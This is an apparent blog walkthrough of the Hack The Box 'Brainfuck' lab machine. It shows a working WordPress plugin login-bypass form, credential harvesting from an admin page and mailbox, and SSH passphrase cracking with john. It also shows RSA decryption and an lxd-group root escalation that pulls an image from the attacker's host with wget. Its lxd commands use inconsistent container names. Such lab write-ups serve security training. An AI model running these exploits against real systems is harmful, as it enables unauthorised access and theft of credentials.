---
title: Hack The Box - Brainfuck (Without Metasploit)
date: 2021-01-08 21:48:00 +0800
categories: [hackthebox]
tags: [linux, samba]
---

An insane box on the list? Really?

![](/assets/images/brainfuck.png){:height="414px" width="615px"}

# Configuration

The operating system that I will be using to tackle this machine is a Kali Linux VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

```bash
$ echo "10.10.10.17 brainfuck.htb" | sudo tee -a /etc/hosts
```

# Reconnaissance

```bash
$ nmap -sT -sV -sC -Pn brainfuck.htb 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-08 06:06 EST
Nmap scan report for brainfuck (10.10.10.17)
Host is up (0.012s latency).
Not shown: 995 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) USER PIPELINING CAPA TOP UIDL AUTH-RESP-CODE RESP-CODES
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: more have LOGIN-REFERRALS IDLE post-login ID Pre-login listed AUTH=PLAINA0001 LITERAL+ SASL-IR capabilities OK ENABLE IMAP4rev1
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.15 seconds
```

# Enumeration (1)

## Port 443 `nginx 1.10.0`

![](/assets/images/brainfuck1.png)

There is a `Wordpress` website running on this page. Lets run `wpscan` to see what we can get out of this website.

```bash
$ wpscan --disable-tls-checks  --url https://brainfuck.htb                                                         1 ⨯
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.12
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: https://brainfuck.htb/ [10.10.10.17]
[+] Started: Fri Jan  8 06:20:41 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: nginx/1.10.0 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://brainfuck.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: https://brainfuck.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://brainfuck.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.7.3 identified (Insecure, released on 2017-03-06).
 | Found By: Rss Generator (Passive Detection)
 |  - https://brainfuck.htb/?feed=rss2, <generator>https://wordpress.org/?v=4.7.3</generator>
 |  - https://brainfuck.htb/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.7.3</generator>

[+] WordPress theme in use: proficient
 | Location: https://brainfuck.htb/wp-content/themes/proficient/
 | Last Updated: 2020-12-21T00:00:00.000Z
 | Readme: https://brainfuck.htb/wp-content/themes/proficient/readme.txt
 | [!] The version is out of date, the latest version is 3.0.39
 | Style URL: https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3
 | Style Name: Proficient
 | Description: Proficient is a Multipurpose WordPress theme with lots of powerful features, instantly giving a prof...
 | Author: Specia
 | Author URI: https://speciatheme.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0.6 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3, Match: 'Version: 1.0.6'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] wp-support-plus-responsive-ticket-system
 | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
 | Last Updated: 2019-09-03T07:57:00.000Z
 | [!] The version is out of date, the latest version is 9.1.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 7.1.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <============================================> (22 / 22) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Jan  8 06:20:45 2021
[+] Requests Done: 54
[+] Cached Requests: 5
[+] Data Sent: 13.369 KB
[+] Data Received: 161.386 KB
[+] Memory used: 204.449 MB
[+] Elapsed time: 00:00:03
```

If we check out the `wp-support-plus-responsive-ticket-system` plugin, we realise that the version (`7.1.3`) had exploits online.

```bash
$ searchsploit wordpress support plus 7.1.3
--------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                         |  Path
--------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation | php/webapps/41006.txt
WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - SQL Injection        | php/webapps/40939.txt
--------------------------------------------------------------------------------------- ---------------------------------
```

The "Privilege Escalation" vulnerability would allow us to login as anyone without knowing the password, so lets use that.

```bash
$ searchsploit -m 41006                     
  Exploit: WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation
      URL: https://www.exploit-db.com/exploits/41006
     Path: /usr/share/exploitdb/exploits/php/webapps/41006.txt
File Type: ASCII text, with CRLF line terminators

Copied to: /home/kali/Desktop/htb/brainfuck/41006.txt

```

# Exploitation (1)

```

$ cat exploit.html
<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
        Username: <input type="text" name="username" value="administrator">
        <input type="hidden" name="email" value="sth">
        <input type="hidden" name="action" value="loginGuestFacebook">
        <input type="submit" value="Login">
</form>
```

Now, to use it, we just need to open the page with `firefox` and hit `Login`.

```bash
$ firefox exploit.html
```

![](/assets/images/brainfuck2.png)

Now, if we go to `https://brainfuck.htb/wp-admin/`, we have managed to login as `administrator`!

![](/assets/images/brainfuck3.png)

However, even as `administrator`, we are not able to perform much administrative actions. Lets see if there are any other users we can log into using `wp-scan`.

```bash
$ wpscan --disable-tls-checks  --url https://brainfuck.htb --enumerate u
...
[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <===========> (10 / 10) 100.00% Time: 

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] administrator
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

It seems there is another user called `admin`. Let try changing from `administrator` to `admin` in `exploit.html` and logging in. Remember to clear your cookies first!

![](/assets/images/brainfuck4.png)

After clicking `Login` and accessing `https://brainfuck.htb/wp-admin/`, we finally see more pages that we can access!

![](/assets/images/brainfuck5.png)

# Enumeration (2)

## Port 443 `nginx 1.10.0`

![](/assets/images/brainfuck6.png)

Under "Plugins", if we view the settings of the "Easy WP SMTP" plugin, 

![](/assets/images/brainfuck7.png)

We see some interesting settings being saved, including a `SMTP` username and even a `SMTP` password! If we press on `F12` to enter Developer's Mode and view the `HTML` source code, we can see a password being stored as the `value` attribute.

![](/assets/images/brainfuck8.png)

Together with the username and password that we found, we get `orestis:kHGuERB29DNiNE`.

## Port 143 ` Dovecot imapd`

Using `nc`, we can access the `IMAP` service on port `143` and login as `orestis`.

```bash
$ nc -v brainfuck.htb 143  
brainfuck.htb [10.10.10.17] 143 (imap2) open
* OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE AUTH=PLAIN] Dovecot ready.
A1 LOGIN orestis kHGuERB29DNiNE
A1 OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SPECIAL-USE] Logged in
A1 LIST "" * 
* LIST (\HasNoChildren) "/" INBOX
A1 OK List completed (0.000 + 0.000 secs).
```

It seems there's no mail here for us to read.

## Port 110 ` Dovecot pop3d`

Using `nc`, we can access the `POP3` service on port `110` and login as `orestis`.

```bash
$ nc -v brainfuck.htb 110   
brainfuck.htb [10.10.10.17] 110 (pop3) open
+OK Dovecot ready.
USER orestis
+OK
PASS kHGuERB29DNiNE
+OK Logged in.
LIST
+OK 2 messages:
1 977
2 514
.
RETR 1
+OK 977 octets
Return-Path: <www-data@brainfuck.htb>
X-Original-To: orestis@brainfuck.htb
Delivered-To: orestis@brainfuck.htb
Received: by brainfuck (Postfix, from userid 33)
        id 7150023B32; Mon, 17 Apr 2017 20:15:40 +0300 (EEST)
To: orestis@brainfuck.htb
Subject: New WordPress Site
X-PHP-Originating-Script: 33:class-phpmailer.php
Date: Mon, 17 Apr 2017 17:15:40 +0000
From: WordPress <wordpress@brainfuck.htb>
Message-ID: <00edcd034a67f3b0b6b43bab82b0f872@brainfuck.htb>
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8

Your new WordPress site has been successfully set up at:

https://brainfuck.htb

You can log in to the administrator account with the following information:

Username: admin
Password: The password you chose during the install.
Log in here: https://brainfuck.htb/wp-login.php

We hope you enjoy your new site. Thanks!

--The WordPress Team
https://wordpress.org/
.
RETR 2
+OK 514 octets
Return-Path: <root@brainfuck.htb>
X-Original-To: orestis
Delivered-To: orestis@brainfuck.htb
Received: by brainfuck (Postfix, from userid 0)
        id 4227420AEB; Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
To: orestis@brainfuck.htb
Subject: Forum Access Details
Message-Id: <20170429101206.4227420AEB@brainfuck>
Date: Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
From: root@brainfuck.htb (root)

Hi there, your credentials for our "secret" forum are below :)

username: orestis
password: kIEnnfEKJ#9UmdO

Regards
.
```

We found a mail talking about a "secret" forum and it even included credentials to login!

## Port 443 `nginx 1.10.0`

Where is this "secret" forum? If we view the certificate on the `Wordpress` website, we will see another domain name under "Subject Alt Names" called `sup3rs3cr3t.brainfuck.htb`. Lets add this domain to our `/etc/hosts` and access it.

```bash
$ cat /etc/hosts
...
10.10.10.17 brainfuck.htb www.brainfuck.htb sup3rs3cr3t.brainfuck.htb
```

![](/assets/images/brainfuck9.png)

After logging in with `orestis:kIEnnfEKJ#9UmdO`, we see more threads.

![](/assets/images/brainfuck10.png)

The `Key` thread had some messages but appear to be jibberish.

![](/assets/images/brainfuck11.png)

The `SSH Access` thread talked about `orestis`'s `SSH` key and it will be further discussed in an encrypted thread, which is probably the `Key` thread we found.

![](/assets/images/brainfuck12.png)

One thing to note is that the user `orestis` always end his messages with `Orestis - Hacking for fun and profit`. Maybe this can help us figure out how to decrypt this?

### Vignere Cipher

The last line in `orestis`'s messages in the `Key` thread are the encrypted version of `Orestis - Hacking for fun and profit`, using the Vignere Cipher. Using a `python` script I made, we are able to retrieve the password that was used.

```python
ciphertext = "Pieagnm - Jkoijeg nbw zwx mle grwsnn".replace(" ","").replace("-","")
plaintext =  "Orestis - Hacking for fun and profit".replace(" ","").replace("-","")

output = ""

for idx in range(len(plaintext)):

        diff = (ord(ciphertext[idx]) - ord(plaintext[idx])) % 26

        if ciphertext[idx].isupper():
                output += chr(ord('A') + diff)
        else:
                output += chr(ord('a') + diff)

print(output)
```

```bash
BrainfuCkmybrainfuckmybrainfu
```

In Vignere Cipher, the key that is used is repeated multiple times in order to match the length of the plaintext. Hence, the key is `fuckmybrain`.

Using this key and [Cyberchef](https://gchq.github.io/CyberChef/#recipe=Vigen%C3%A8re_Decode('fuckmybrain')&input=WWJnYnEgd3BsIGd3IGx0byB1ZGduanUgZmNwcCwgQyBqeWJjIHpmdSB6cnJ5b2xxcCB6ZnV6IHhqcyBya2VxeGZybCBvandjZWVjIEogdW92ZyA6KQoKbW52emU6Ly8xMC4xMC4xMC4xNy84emI1cmExMG05MTUyMTg2OTdxMWg2NTh3Zm9xMHpjOC9mcm1meWN1L3NwX3B0cg), we are able to decrypt `admin`'s message to get a link to an `RSA` private key!

![](/assets/images/brainfuck13.png)

### Passphrase-protected private SSH Key

After downloading the key, we attempt to login to `orestis` with it but failed as it is protected with a passphrase.

```bash
$ chmod 600 id_rsa
$ ssh -i id_rsa orestis@brainfuck.htb
The authenticity of host 'brainfuck.htb (10.10.10.17)' can't be established.
ECDSA key fingerprint is SHA256:S+b+YyJ/+y9IOr9GVEuonPnvVx4z7xUveQhJknzvBjg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'brainfuck.htb,10.10.10.17' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
orestis@brainfuck.htb: Permission denied (publickey).
```

Using `ssh2john`, we can extract a hash of the passphrase and crack it with `john`.

```bash
$ /usr/share/john/ssh2john.py id_rsa > hash.txt
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
3poulakia!       (id_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:02 DONE (2021-01-08 07:53) 0.3649g/s 5234Kp/s 5234Kc/s 5234KC/sa6_123..*7¡Vamos!
Session completed
```

# user.txt

With the passphrase and the private `SSH` key, we can now login as `orestis` and get the user flag.

```bash
$ ssh -i id_rsa orestis@brainfuck.htb                 
Enter passphrase for key 'id_rsa': 

orestis@brainfuck:~$ cat user.txt
2c11XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

# Enumeration (3)

On `orestis` home directory were a few files:

`encrypt.sage`:
```python
encrypt.sage 
nbits = 1024

password = open("/root/root.txt").read().strip()
enc_pass = open("output.txt","w")
debug = open("debug.txt","w")
m = Integer(int(password.encode('hex'),16))

p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
n = p*q
phi = (p-1)*(q-1)
e = ZZ.random_element(phi)
while gcd(e, phi) != 1:
    e = ZZ.random_element(phi)



c = pow(m, e, n)
enc_pass.write('Encrypted Password: '+str(c)+'\n')
debug.write(str(p)+'\n')
debug.write(str(q)+'\n')
debug.write(str(e)+'\n')
```

`debug.txt`:
```
7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
```

`output.txt`:
```
Encrypted Password: 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
```

### RSA Decryption

From my understanding, the root flag was encrypted with RSA with the `p`, `q` and `e` values provided in the `debug.txt` and the output was saved in `output.txt`. I had a fair bit of CTF experience so decrypting it was no problem :)

This script require the `pycrypto` module, which can be installed like this:

```
$ sudo pip3 install pycrypto
```

```python
from Crypto.Util.number import long_to_bytes

# From debug.txt
p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997

# From output.txt
c = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182

def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)

def modinv(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        raise Exception('modular inverse does not exist')
    else:
        return x % m


d = modinv(e, (p-1) * (q-1))
m = pow(c,d,p * q)

print(long_to_bytes(m))
```

# root.txt (1)

Running the script will output the plaintext root flag.

```
b'6efcXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
```

However, according to OSCP exam's standard, we will need to get a working shell as `root` so lets try harder.

# Enumeration (4)

The current user `orestis` is in the `lxd` group.

```bash
orestis@brainfuck:/tmp$ id
uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare)
```

As a member of the `lxd` group, we can spawn a `lxc` container that mounts the file system and allow us to read files as `root`!

# Exploitation (2)

As there are no images available on the box, we can transfer one over from our box and add it.

```bash
$ git clone https://github.com/saghul/lxd-alpine-builder
$ cd lxd-alpine-builder
$ sudo ./build-alpine
...
$ ls 
alpine-v3.12-x86_64-20210108_0810.tar.gz 
```

We can then transfer the image over by using the `SimpleHTTPServer` module or using a recent useful tool I found called [`updog`](https://github.com/sc0tfree/updog).

On the attacker machine:
```bash
$ sudo updog -p 80                              
[+] Serving /home/kali/Desktop/htb/brainfuck/lxd-alpine-builder...
 * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
```

On the `Brainfuck` machine:
```bash
orestis@brainfuck:/tmp$ wget http://10.10.X.X/alpine-v3.12-x86_64-20210108_0810.tar.gz
```

Finally, we can just execute a series of commands to gain `root` access:

```bash
orestis@brainfuck:/tmp$ lxc image import alpine-v3.12-x86_64-20210108_0810.tar.gz 
Image imported with fingerprint: 471bec5017c23d969a92020aabb84dadd3df90cdad571ad8a581ae13b4b010e8
orestis@brainfuck:/tmp$ lxc image import alpine-v3.12-x86_64-20210108_0810.tar.gz --alias myimage
Transferring image: 100% (267.12MB/s)error: UNIQUE constraint failed: images.fingerprint
orestis@brainfuck:/tmp$ lxc init myimage myexploit -c security.privileged=true
Creating myexploit
orestis@brainfuck:/tmp$ lxc config device add myexploit mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to myexploit
orestis@brainfuck:/tmp$ lxc start init 
orestis@brainfuck:/tmp$ lxc exec init /bin/sh
~ # id
uid=0(root) gid=0(root)
```

And get our flag:

```bash
~ # cat /mnt/root/root/root.txt
6efcXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

### Rooted ! Thank you for reading and look forward for more writeups and articles !